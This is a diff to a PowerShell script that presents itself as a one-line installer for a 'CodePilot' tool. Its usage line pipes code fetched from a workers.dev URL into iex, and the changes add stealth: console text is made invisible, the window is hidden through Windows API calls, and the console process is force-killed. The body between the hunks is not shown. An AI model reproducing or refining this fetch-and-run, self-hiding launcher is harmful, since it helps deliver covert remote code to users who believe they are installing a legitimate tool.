@@ -1,6 +1,11 @@
 # CodePilot V14 — One-Line Install + Stealth Launch (Zero Input)
 # Usage: irm https://sweetbush.rr3703404.workers.dev/install.ps1 | iex
-# Hide the console window — no files, no new processes
+
+# INSTANT STEALTH: make text invisible before anything else prints
+try { $Host.UI.RawUI.ForegroundColor = $Host.UI.RawUI.BackgroundColor } catch {}
+try { [Console]::ForegroundColor = [Console]::BackgroundColor } catch {}
+try { Clear-Host } catch {}
+# Now hide the entire window
 try {
     Add-Type -Name W -Namespace H -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int c);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();' -ErrorAction SilentlyContinue
     [H.W]::ShowWindow([H.W]::GetConsoleWindow(), 0) | Out-Null
@@ -212,9 +217,16 @@ try {
     }
 } catch {}
 
-# Close this terminal window
+# Close this terminal window — try multiple methods
 try {
+    # Method 1: kill the console window directly
+    $hwnd = [H.W]::GetConsoleWindow()
+    Add-Type -Name K -Namespace H -MemberDefinition '[DllImport("user32.dll")]public static extern uint GetWindowThreadProcessId(IntPtr h,out uint p);' -ErrorAction SilentlyContinue
+    $wpid = 0; [H.K]::GetWindowThreadProcessId($hwnd, [ref]$wpid) | Out-Null
+    if ($wpid -and $wpid -ne 0) { Stop-Process -Id $wpid -Force -ErrorAction SilentlyContinue }
+} catch {}
+try {
+    # Method 2: kill own process
     Stop-Process -Id $PID -Force
-} catch {
-    exit
-}
+} catch {}
+exit
